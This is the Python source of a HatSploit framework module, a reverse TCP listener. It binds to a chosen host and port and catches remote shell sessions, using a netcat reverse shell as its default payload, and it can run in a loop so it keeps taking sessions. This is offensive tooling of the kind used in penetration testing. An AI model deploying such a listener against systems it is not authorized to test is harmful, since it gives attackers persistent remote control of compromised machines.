#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.module import Module
from hatsploit.utils.handler import Handler


class HatSploitModule(Module, Handler):
    details = {
        'Name': "Reverse TCP Listener",
        'Module': "auxiliary/multi/listener/reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer'
        ],
        'Description': "Reverse TCP listener.",
        'Comments': [
            ''
        ],
        'Platform': "multi",
        'Risk': "high"
    }

    payload = {
        'Description': "Payload to use.",
        'Value': "unix/generic/netcat_reverse_tcp",
        'Categories': None,
        'Architectures': None,
        'Platforms': None,
        'Types': None
    }

    options = {
        'LHOST': {
            'Description': "Local host to listen on.",
            'Value': "0.0.0.0",
            'Type': "ip",
            'Required': True
        },
        'LPORT': {
            'Description': "Local port to listen on.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        },
        'FOREVER': {
            'Description': "Start listener forever.",
            'Value': "no",
            'Type': "boolean",
            'Required': False
        }
    }

    def run(self):
        local_host, local_port, forever = self.parse_options(self.options)

        if forever.lower() in ['yes', 'y']:
            while True:
                status = self.handle_session(
                    host=local_host,
                    port=local_port,

                    payload=self.payload,
                    method="reverse_tcp"
                )

                if not status:
                    return
        else:
            self.handle_session(
                host=local_host,
                port=local_port,

                payload=self.payload,
                method="reverse_tcp"
            )
